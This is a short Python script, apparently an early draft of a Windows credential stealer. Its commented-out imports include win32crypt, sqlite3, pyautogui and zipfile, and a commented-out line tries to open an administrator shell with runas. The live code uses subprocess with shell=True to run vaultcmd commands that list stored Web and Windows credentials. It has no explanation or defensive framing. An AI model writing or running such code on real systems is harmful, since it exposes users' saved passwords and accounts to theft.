# import requests
import os
import subprocess

# import socket
# import sqlite3
# import win32crypt
# import math
# import datetime
# import json
# import platform
# import psutil
# import GPUtil
# import re
# import pandas
# import shutil
# import cV2
# import pyautogui
# import zipfile

def GetPath():
    print("Getting Current working directory...")
    print(os.getcwd())
    print()

# command1 = "runas /noprofile /user:administrator cmd";

command1 = "vaultcmd /listcreds:'Web Credentials' /all";
command2 = "vaultcmd /listcreds:'Windows Credentials' /all";




subprocess.Popen(command1, shell=True)
subprocess.Popen(command2, shell=True)
